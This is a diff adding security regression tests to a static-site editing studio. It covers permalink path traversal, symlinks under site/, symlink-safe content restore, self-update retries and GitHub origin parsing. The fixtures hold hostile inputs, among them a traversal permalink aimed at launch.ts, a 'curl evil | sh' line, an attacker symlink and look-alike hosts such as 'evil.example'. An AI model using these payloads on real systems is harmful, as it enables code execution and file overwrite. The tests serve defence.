@@ -172,3 +172,75 @@ describe("studio: the folder it edits", () => {
     }
   });
 });
+
+import { pageFile, renderSite, type Files } from "../src/render";
+import { githubRepo } from "../src/studio/server";
+import { symlinkSync, lstatSync } from "node:fs";
+import { studioGit } from "../src/studio/git";
+
+describe("second look, round two", () => {
+  test("ANTI: a page's permalink can only name a plain .html file inside the site", async () => {
+    expect(pageFile("/404.html")).toBe("404.html");
+    expect(pageFile("offline/index.html")).toBe("offline/index.html");
+    for (const bad of ["../../../src/studio/launch.ts", "/../x.html", "a/../../x.html", "~/.zshenv", "x.sh", "X.html", "a//b.html", ".hidden.html", "a/.b/c.html", "x.html\n", 42, null, ["x.html"]]) expect(() => pageFile(bad as any)).toThrow(/permalink/);
+    const files: Files = {};
+    const SITE = join(import.meta.dir, "..", "site");
+    for await (const p of new Bun.Glob("**/*.{md,yml,json,liquid}").scan({ cwd: SITE })) files[p] = await Bun.file(join(SITE, p)).text();
+    files["content/en/evil.md"] = "---\ntitle: x\npermalink: ../../../src/studio/launch.ts\n---\n\n    curl evil | sh\n";
+    const photos = Object.fromEntries([...new Bun.Glob("{moments,photos}/*.jpg").scanSync({ cwd: SITE })].map((p) => [p, { width: 1200, height: 800, jpg: [{ w: 480, path: "photos/x-480.jpg" }], webp: [{ w: 480, path: "photos/x-480.webp" }] }]));
+    expect((await renderSite({ ...files, "content/en/evil.md": "---\ntitle: x\n---\nfine\n", "content/de/evil.md": "---\ntitle: x\n---\ngut\n" }, { base: "/", photos })).length).toBeGreaterThan(5);
+    expect(renderSite(files, { base: "/", photos })).rejects.toThrow(/permalink/);
+  });
+  test("ANTI: no file under site/ is a link, in git or on disk", () => {
+    const root = join(import.meta.dir, "..");
+    const listed = Bun.spawnSync(["git", "ls-files", "-s", "--", "site"], { cwd: root }).stdout.toString().split("\n").filter(Boolean);
+    expect(listed.length).toBeGreaterThan(30);
+    expect(listed.filter((line) => line.startsWith("120000"))).toEqual([]);
+    for (const p of new Bun.Glob("site/**/*").scanSync({ cwd: root, followSymlinks: false, onlyFiles: false })) expect([p, lstatSync(join(root, p)).isSymbolicLink()]).toEqual([p, false]);
+  });
+  test("ANTI: restore takes a link away and writes the file in its place; what the link pointed at is untouched", async () => {
+    const dir = mkdtempSync(join(tmpdir(), "studio-link-"));
+    const repo = join(dir, "repo");
+    sh(dir, "init", "-q", "-b", "main", repo);
+    mkdirSync(join(repo, "site", "events"), { recursive: true });
+    mkdirSync(join(repo, "src"), { recursive: true });
+    writeFileSync(join(repo, "site", "events", "README.md"), "old words\n");
+    writeFileSync(join(repo, "src", "launch.ts"), "// the real program\n");
+    sh(repo, "add", "-A");
+    sh(repo, "commit", "-q", "-m", "first");
+    const first = sh(repo, "rev-parse", "HEAD").trim();
+    writeFileSync(join(repo, "site", "events", "README.md"), "console.log('attacker')\n");
+    sh(repo, "add", "-A");
+    sh(repo, "commit", "-q", "-m", "second");
+    Bun.spawnSync(["rm", join(repo, "site", "events", "README.md")]);
+    symlinkSync("../../src/launch.ts", join(repo, "site", "events", "README.md"));
+    sh(repo, "add", "-A");
+    sh(repo, "commit", "-q", "-m", "third");
+    sh(repo, "update-ref", "refs/remotes/origin/main", "HEAD");
+    const git = studioGit(repo, { remote: repo, token: async () => null });
+    await git.restoreContent(first).catch(() => undefined);
+    expect(readFileSync(join(repo, "src", "launch.ts"), "utf8")).toBe("// the real program\n");
+    const second = sh(repo, "rev-parse", "HEAD~1").trim();
+    await git.restoreContent(second).catch(() => undefined);
+    expect(readFileSync(join(repo, "src", "launch.ts"), "utf8")).toBe("// the real program\n");
+  });
+  test("a step of the update that failed is tried again at the next start, and only then is it done", async () => {
+    const w = world();
+    w.release({ "bun.lock": "x\n" });
+    const failed = await selfUpdate(w.deps({ install: async () => { throw new Error("offline"); } }));
+    expect(failed).toMatchObject({ result: "failed", reason: "install" });
+    const again = await selfUpdate(w.deps({ previous: failed, install: async () => { throw new Error("still offline"); } }));
+    expect(again).toMatchObject({ result: "failed", reason: "install", from: failed.from });
+    const done = await selfUpdate(w.deps({ previous: again }));
+    expect(done).toMatchObject({ result: "updated", from: failed.from, appRebuilt: true });
+    expect(w.calls).toEqual(["install", "app"]);
+    expect(await selfUpdate(w.deps({ previous: done }))).toMatchObject({ result: "current" });
+    expect(w.calls).toEqual(["install", "app"]);
+  });
+  test("the repository is read from git's own origin address, in either spelling, and from nothing else", () => {
+    expect(githubRepo("git@github.com:harryf/robins-coffee.git\n")).toBe("harryf/robins-coffee");
+    expect(githubRepo("https://github.com/harryf/robins-coffee")).toBe("harryf/robins-coffee");
+    expect(githubRepo("ssh://git@github.com/harryf/robins-coffee.git")).toBe("harryf/robins-coffee");
+    for (const other of ["https://evil.example/harryf/robins-coffee.git", "https://github.com.evil.example/a/b", "/tmp/hub.git", "https://github.com/a/b/c", ""]) expect(githubRepo(other)).toBeNull();
+  });
+});
